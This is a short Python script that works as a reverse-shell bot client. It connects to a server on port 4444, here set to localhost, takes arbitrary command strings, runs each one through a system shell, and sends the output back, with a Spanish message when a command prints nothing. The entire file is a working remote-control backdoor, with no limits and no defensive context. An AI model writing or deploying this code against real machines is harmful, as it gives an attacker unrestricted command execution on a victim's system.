import subprocess
import socket


host = 'localhost'
port = 4444


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
server.sendall("bot".encode())


while True:
    cmd = server.recv(1024).decode().strip()
    cmdPoc = subprocess.Popen(
        cmd, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE,
        text=True, 
        shell=True)

    out, err = cmdPoc.communicate()

    if not out and not err:
        result = "[!] Comando sin salida"
    else:
        result = out if out else err

    server.sendall(result.encode())